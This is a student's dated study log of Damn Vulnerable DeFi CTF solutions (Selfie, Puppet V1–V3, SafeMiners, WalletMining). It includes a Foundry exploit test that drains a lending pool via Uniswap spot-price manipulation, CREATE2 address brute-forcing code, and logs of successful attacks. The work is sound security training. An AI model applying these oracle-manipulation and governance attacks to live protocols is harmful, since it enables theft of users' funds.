---
timezone: Asia/Shanghai 
---

# Lori

1. 自我介绍
[Lori](https://www.notion.so/Lori-b62d3531f44f467baa56ddb161f0ef3e?pvs=21), 研三在读学生，研究方向为区块链安全。

2. 你认为你会完成本次残酷学习吗？
保证至少能够完成90%，并参加 BlazCTF。

## Notes

<!-- Content_START -->

### 2024.08.29

Ethernaut 之前我已经做完了了，写了部分[解析和PoC](https://github.com/Chocolatieee0929/ContractSafetyStudy/tree/main/ethernaut).
damn-vulnerable-defi 写了一半，接下来会接着完成剩余的部分，前面3天先复习。
[Selfie](https://github.com/Chocolatieee0929/ContractSafetyStudy/blob/main/damn-vulnerable-defi/test/Levels/selfie/Selfie.t.sol)
这是有关治理投票的相关攻击，算是比较经典的。
我们注意到，想要提出的提案必须满足以下条件：
1. 提案者必须拥有足够的投票权（在上次快照时间拥有超过DVT总供应量的一半）
2. 接收者不能是治理合约本身msg.sender
第一点，由于没有对持有代币时间的限制，攻击者可以通过闪电贷来绕过第一点的检查。

### 2024.08.30

[Puppet](https://github.com/Chocolatieee0929/ContractSafetyStudy/tree/main/damn-vulnerable-defi/test/Levels/puppet)
Root cause：Spot price
这是一个lending protocol, 通过uniswapv1交易对的瞬时价格来计算coll，攻击者可以通过swap来影响价格，从而掏空池子。

log：
```
function testExploit_Puppet() public {
        uint256 v1PairBalance = dvt.balanceOf(address(puppetPool));
        console.log("v1PairBalance:", v1PairBalance);

        /* 
         * 1. 将 eth/dvt 降低，通过swap 9.9 eth，可以考虑将1000e18 dvt注入池子
         * 2. 将lending pool的钱通过借款借款 
         */
        emit log("-------------------------- before attack ---------------------------------");
        
        uint256 eth1 = calculateTokenToEthInputPrice(ATTACKER_INITIAL_TOKEN_BALANCE, UNISWAP_INITIAL_TOKEN_RESERVE, UNISWAP_INITIAL_ETH_RESERVE);
        uint256 eth2 = calculateTokenToEthInputPrice(UNISWAP_INITIAL_TOKEN_RESERVE, UNISWAP_INITIAL_TOKEN_RESERVE, UNISWAP_INITIAL_ETH_RESERVE);
        
        emit log_named_decimal_uint("getTokenToEthInputPrice", uniswapExchange.getTokenToEthInputPrice(ATTACKER_INITIAL_TOKEN_BALANCE), 18);
        emit log_named_decimal_uint("attacker use ATTACKER_INITIAL_TOKEN_BALANCE to swap eth1", eth1, 18);
        emit log_named_decimal_uint("attacker use UNISWAP_INITIAL_TOKEN_RESERVE to swap eth1", eth2, 18);
        
        uint256 shouldETH = puppetPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
        emit log_named_decimal_uint("attacker should spend ETH amount", shouldETH, 18);
        emit log_named_decimal_uint("attacker actually hold ETH amount", address(attacker).balance, 18);

        emit log("-------------------------- after attack ---------------------------------");
        vm.startPrank(attacker);
        // 1. 将 eth/dvt 降低，通过swap 9.9 eth，可以考虑将1000e18 dvt注入池子
        dvt.approve(address(uniswapExchange), ATTACKER_INITIAL_TOKEN_BALANCE);
        uniswapExchange.tokenToEthSwapInput(ATTACKER_INITIAL_TOKEN_BALANCE, 1, block.timestamp + 1 days);
        shouldETH = puppetPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
        emit log_named_decimal_uint("attacker should spend ETH amount", shouldETH, 18);
        emit log_named_decimal_uint("attacker actually hold ETH amount", address(attacker).balance, 18);

        // 2. 将lending pool的钱通过借款借款 
        puppetPool.borrow{value: shouldETH}(POOL_INITIAL_TOKEN_BALANCE);
        vm.stopPrank();
        
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }
```

### 2024.08.31
[puppetV2](https://github.com/Chocolatieee0929/ContractSafetyStudy/blob/main/damn-vulnerable-defi/test/Levels)
与最初版本不同的地方在于使用WETH-token交易对，现在还是关注质押WETH数量是如何计算的，
```
// PuppetV2.sol
    function calculateDepositOfWETHRequired(uint256 tokenAmount) public view returns (uint256) {
        return (_getOracleQuote(tokenAmount) * 3) / 10 ** 18;
    }

    // Fetch the price from Uniswap v2 using the official libraries
    function _getOracleQuote(uint256 amount) private view returns (uint256) {
        (uint256 reservesWETH, uint256 reservesToken) =
            // 获取交易对数量
            UniswapV2Library.getReserves(_uniswapFactory, address(_weth), address(_token));
        return UniswapV2Library.quote(amount * (10 ** 18), reservesToken, reservesWETH);
    }
// UniswapV2Library.sol
    function quote(uint256 amountA, uint256 reserveA, uint256 reserveB) internal pure returns (uint256 amountB) {
        require(amountA > 0, "UniswapV2Library: INSUFFICIENT_AMOUNT");
        require(reserveA > 0 && reserveB > 0, "UniswapV2Library: INSUFFICIENT_LIQUIDITY");
        amountB = (amountA * reserveB) / reserveA;
    }
```
同样的，质押物价值也是通过uniswapv2池子里交易对数量比值作为瞬时价格，突破点也是在这。与上边不同的地在于需要将eth置换成WETH。

### 2024.09.01
Take a break over the weekend~ 

### 2024.09.02
[SafeMiners](https://github.com/Chocolatieee0929/ContractSafetyStudy/blob/main/damn-vulnerable-defi/test/Levels/safe-miners/SafeMiners.t.sol)
做到这题发现自己fork的repo是V2的，明天再做更新的，有点大意了>v<
这类问题非常经典。具体来说，当代币转账到一个未部署的地址时，攻击者可以利用 `CREATE2` 指令，通过暴力计算不同的 salt 值来预测合约地址，直至找到目标地址。然后，攻击者可以将攻击合约部署到该地址，并执行代币转账操作。
```
Logs:
  🧨 Let's see if you can break it... 🧨
  dvt.balanceOf(DEPOSIT_ADDRESS): 2000042.000000000000000000
  dvt.balanceOf(ATTACKER): 0.000000000000000000
  dvt.balanceOf(DEPOSIT_ADDRESS): 0.000000000000000000
  dvt.balanceOf(ATTACKER): 2000042.000000000000000000
  
🎉 Congratulations, you can go to the next level! 🎉
```
### 2024.09.03
[puppetV3](https://github.com/Chocolatieee0929/damn-vulnerable-defi/blob/master/test/puppet-v3/PuppetV3)

In the **PuppetV3Pool** contract, the **borrow** function relies on Uniswap V3's TWAP Oracle, which uses a 10-minute interval for price averaging. While this TWAP Oracle is generally secure on the mainnet, it may be more vulnerable to manipulation when the pool has low liquidity and fewer transactions. In such scenarios, the TWAP Oracle's price is based on the first swap transaction in each block, making it easier for attackers to influence the oracle price by executing trades that affect this transaction.

To get the flag for this challenge, I swapped 110e18 tokens for 99e18 WETH to manipulate the price. Meanwhile, I waited for a certain period, as longer wait times are better (refer to the TWAP calculation formula). Finally, I performed the borrowing in the next block.
The required WETH in the lending pool dropped sharply from 3000000000000000000000000 to 143239918968367545.

ps: At first, I tried to manipulate the tick by adding liquidity, but later I realized I was completely mistaken, how can adding liquidity move the tick, haha >v< I'm reviewing Uni V3 while working on the challenge.

```
[PASS] test_puppetV3() (gas: 826104)
Logs:
  ============= Before Attacker =============
  Player balance 1000000000000000000
  Player token balance 110000000000000000000
  Lending pool token balance 1000000000000000000000000
  Lending pool WETH balance 0
  Lending pool WETH required 3000000000000000000000000
   
  ============= Price Manipulation =============
  Swap Token: 110.000000000000000000
  Receive WETH: 99.999999999999999999
  time out 114s
  Lending pool WETH required 143239918968367545
   
  ============= After Attacker =============
  Player balance 856760081031632455
  Player token balance 9397757867327790806
  Lending pool token balance 0
  Lending pool WETH balance 143239918968367545
  Lending pool WETH required 0
```
### 2024.09.05
[WalletMining](https://github.com/Chocolatieee0929/damn-vulnerable-defi/blob/master/test/wallet-mining/WalletMining.t.sol)
读了AuthorizerUpgradeable.needsInit发现是一个很大的数，原因后面再补充，紧接着开启了我漫长的凑地址之路
### 2024.09.06
接前一天，继续算地址，最后采用的是暴力解法
```
while (!flag) {
    address target = vm.computeCreate2Address(
        keccak256(abi.encodePacked(keccak256(initializer), nonce)),
        keccak256(abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(address(singletonCopy))))),
        address(proxyFactory)
    );
    if (target == USER_DEPOSIT_ADDRESS) {
        flag = true;
        break;
    }
    nonce ++;
}
```
最后通过了
```
Ran 1 test for test/wallet-mining/WalletMining.t.sol:WalletMiningChallenge
[PASS] test_walletMining() (gas: 463716)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.03ms (1.18ms CPU time)
```

<!-- Content_END -->
